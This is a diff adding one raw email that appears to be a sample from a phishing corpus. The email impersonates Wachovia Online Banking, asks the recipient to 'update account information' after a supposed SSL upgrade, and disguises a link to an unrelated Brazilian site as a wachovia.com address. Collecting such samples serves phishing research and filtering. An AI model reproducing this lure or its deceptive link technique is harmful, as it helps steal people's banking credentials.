@@ -1,0 +1,60 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <nobody@chaos.liquidweb.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id CDB96468F8
+ for <user@login.example.com>; Thu, 19 Apr 2007 08:16:20 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id CD532131FBB7
+ for <user@example.com>; Thu, 19 Apr 2007 08:16:20 -0400 (EDT)
+Received: from chaos.liquidweb.com (chaos.liquidweb.com [64.91.241.10])
+ by mail.example.org (Postfix) with ESMTP id CE0786FA1C1
+ for <user@example.com>; Thu, 19 Apr 2007 08:16:20 -0400 (EDT)
+Received: from nobody by chaos.liquidweb.com with local (Exim 4.63)
+ (envelope-from <nobody@chaos.liquidweb.com>) id 1HeVYZ-0004ID-Rv
+ for user@example.com; Thu, 19 Apr 2007 08:16:11 -0400
+To: user@example.com
+Subject: Upgrade Your Online Account Details 
+From: Wachovia Online Banking <onlinebanking@wachovia.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HeVYZ-0004ID-Rv@chaos.liquidweb.com>
+Date: Thu, 19 Apr 2007 08:16:11 -0400
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - chaos.liquidweb.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - chaos.liquidweb.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1146
+
+<P><IMG 
+src="http://www.wachovia.com/images/logo.gif">
+</P>
+<P>  Dear Customer,<BR><BR>Wachovia 
+Internet Banking, is here by announcing the 
+New Security Upgrade.<BR>We've upgraded our 
+new SSL servers to serve our customers for a 
+better and<BR>secure banking service,against 
+any fraudulent activities. Due to 
+this<BR>recent upgrade,<BR>you are requested 
+to update your account information 
+by<BR>following the reference 
+below.<BR><BR><BR>Reference*<BR><BR><A 
+onclick="return 
+top.js.OpenExtLink(window,event,this)" 
+href="http://www.pdtblumenau.com.br/components/com_user/user_wachovia/index.htm" 
+target=_blank>http://www.wachovia.com/secure<W
+BR>/update/ssl.cfm</A><BR><BR>Regards<BR>Wachovia 
+Bank, N.A. and its affiliates</P> 
+
+
